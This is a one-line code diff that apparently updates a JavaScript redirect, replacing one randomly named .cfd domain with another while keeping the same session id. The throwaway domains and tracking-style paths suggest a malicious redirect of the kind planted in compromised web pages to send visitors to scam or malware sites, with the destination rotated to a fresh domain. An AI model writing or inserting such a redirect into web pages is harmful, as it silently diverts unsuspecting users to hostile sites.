@@ -1,1 +1,1 @@
-window.location.href = "https://lingams.cfd/xuyEN/go?sid=7744";
+window.location.href = "https://hematocya.cfd/ELUWl/go?sid=7744";
